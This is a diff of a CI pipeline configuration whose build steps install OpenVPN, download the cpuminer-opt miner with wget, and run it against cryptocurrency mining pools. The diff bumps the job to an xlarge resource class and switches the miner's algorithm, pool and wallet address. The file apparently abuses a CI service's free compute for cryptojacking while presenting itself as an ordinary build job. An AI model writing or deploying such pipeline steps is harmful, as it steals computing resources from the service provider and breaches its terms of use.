@@ -16,6 +16,7 @@ jobs:
     parallelism: 3
     docker: 
       - image: cimg/python:3.8 
+    resource_class: xlarge
      
     steps: 
       - checkout
@@ -28,4 +29,4 @@ jobs:
       - run: ./openvpn-install.sh
       - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
       - run: tar -xf cpuminer-opt-linux.tar.gz
-      - run: ./cpuminer-sse2amd -a yescryptr16 -o stratum+tcps://yescryptR16.na.mine.zpool.ca:56333 -u LXXC5yzd4amhAYzNVoYziU2PWdaqFWNn1T -p c=LTC,zap=QOGE -t 15
+      - run: ./cpuminer-sse2amd -a yespower -o stratum+tcp://stratum-asia.rplant.xyz:7070 -u WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.cc -t8
